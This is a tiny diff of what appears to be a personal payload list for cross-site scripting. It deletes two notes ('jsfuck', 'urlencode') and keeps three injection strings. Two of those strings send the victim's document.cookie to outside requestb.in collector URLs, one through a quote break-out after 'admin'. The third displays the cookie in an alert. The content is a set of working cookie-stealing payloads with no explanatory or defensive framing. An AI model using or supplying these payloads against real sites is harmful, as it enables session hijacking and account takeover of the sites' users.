@@ -1,6 +1,3 @@
-jsfuck
-urlencode
-
 admin';(new Image).src='http://requestb.in/z4dmjrz4?ab='+document.cookie;x='
 <script>(new Image).src='http://requestb.in/1do8r5d1?ab='+document.cookie</script>
 test"><script>alert(document.cookie)</script>
